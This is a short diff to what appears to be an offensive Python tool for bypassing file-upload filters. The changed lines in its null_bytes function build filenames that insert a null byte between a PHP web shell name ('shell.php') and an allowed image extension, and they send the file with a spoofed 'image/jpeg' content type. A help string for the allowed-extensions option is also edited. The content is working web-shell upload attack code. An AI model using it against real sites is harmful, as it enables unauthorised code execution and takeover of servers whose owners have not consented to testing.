@@ -575,7 +575,7 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
 
                     counter += 1
                     filename = 'shell.php'
-                    filename_ext = filename.replace("shell.php", f"shell{val_ext}{byte}{ext}")
+                    filename_ext = filename.replace("shell.php", f"shell{ext}{byte}.{val_ext}")
                     files = {
                         f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
                         'submit': (None, 'Upload Image')
@@ -603,7 +603,7 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
 
             counter += 1
             filename = 'shell.php'
-            filename_ext = filename.replace("shell.php", f"shell{temp_extension}{byte}{ext}")
+            filename_ext = filename.replace("shell.php", f"shell{ext}{byte}.{temp_extension}")
             files = {
                 f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
                 'submit': (None, 'Upload Image')
@@ -817,7 +817,7 @@ def main():
                       default="required_to_be_true")
 
     parser.add_option('-a', "--allowed", type="string", dest="allowed_extensions",
-                      help="Provide allowed extensions to be uploaded, for example: php,asp,jsp,perl",
+                      help="Provide allowed extensions to be uploaded, for example: jpeg,png",
                       default="required_to_be_true")
 
     parser.add_option('-H', "--header", type="string", dest="header",
